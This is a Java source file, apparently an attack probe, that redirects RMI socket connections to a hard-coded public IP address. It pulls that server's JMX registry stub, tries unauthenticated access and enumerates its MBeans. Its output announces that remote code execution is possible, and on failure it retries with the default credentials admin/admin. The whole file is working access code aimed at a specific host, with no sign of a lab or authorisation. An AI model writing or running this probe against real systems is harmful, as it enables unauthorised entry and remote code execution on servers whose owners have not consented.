import javax.management.remote.*;
import javax.management.remote.rmi.*;
import javax.management.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;

public class JmxRedirect {
  // Redirect any connection to "localhost" -> real server IP
  static final String REAL = "160.202.130.243";
  static class RedirectSF extends RMISocketFactory {
    public Socket createSocket(String host, int port) throws IOException {
      if (host==null || host.equals("localhost") || host.equals("127.0.0.1") || host.equals("0.0.0.0")) {
        System.out.println("[redirect] "+host+":"+port+" -> "+REAL+":"+port);
        host = REAL;
      }
      Socket s = new Socket(); s.setSoTimeout(20000);
      s.connect(new InetSocketAddress(host, port), 20000);
      return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException {
      return new ServerSocket(port);
    }
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RedirectSF());
    // Get stub from registry on 8085
    java.rmi.registry.Registry reg = java.rmi.registry.LocateRegistry.getRegistry(REAL, 8085);
    Remote stub = reg.lookup("jmxrmi");
    System.out.println("Got stub: "+stub);
    // Try direct connect via JMX with the stub (unauth)
    Map<String,Object> env = new HashMap<>();
    try {
      JMXConnector c = new RMIConnector((RMIServer) stub, env);
      c.connect();
      MBeanServerConnection mbsc = c.getMBeanServerConnection();
      System.out.println("CONNECTED! Domains: " + Arrays.toString(mbsc.getDomains()));
      System.out.println("MBean count: " + mbsc.getMBeanCount());
      int cnt=0;
      for (ObjectName on : mbsc.queryNames(null,null)) { cnt++; if(cnt<=40) System.out.println("  "+on); }
      System.out.println(">>> UNAUTH JMX ACCESS CONFIRMED — RCE POSSIBLE <<<");
      c.close();
    } catch (SecurityException se) {
      System.out.println("AUTH REQUIRED (authenticate=true): " + se);
    } catch (Exception e) {
      System.out.println("ERR: " + e.getClass().getName()+": "+e.getMessage());
      // try with creds just in case
      env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
      try {
        JMXConnector c = new RMIConnector((RMIServer) stub, env); c.connect();
        System.out.println("CREDS admin/admin WORKED (default creds!)");
        c.close();
      } catch (Exception e2) {
        System.out.println("creds admin/admin ERR: "+e2.getMessage());
      }
    }
  }
}
